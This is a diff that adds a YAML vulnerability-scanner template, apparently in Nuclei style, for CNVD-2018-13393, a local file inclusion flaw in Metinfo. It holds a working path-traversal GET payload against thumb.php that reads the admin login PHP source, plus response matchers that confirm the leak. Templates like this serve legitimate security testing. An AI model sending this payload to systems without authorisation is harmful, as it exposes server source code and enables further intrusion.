@@ -1,0 +1,25 @@
+id: CNVD-2018-13393
+brief:
+    title: Metinfo - Local File Inclusion
+    by: ritikchaddha
+    level: high
+    about: Metinfo is susceptible to local file inclusion.
+    label:
+        - cnvd2018
+        - cnvd
+        - metinfo
+        - cvnd2018
+        - lfi
+        - vuln
+    score: CVSS:8.6
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/include/thumb.php?dir=http\..\admin\login\login_check.php'
+      signs:
+        - "on": word
+          has:
+            - <?php
+            - login_met_cookie($metinfo_admin_name);
+          in: body
+          need: all
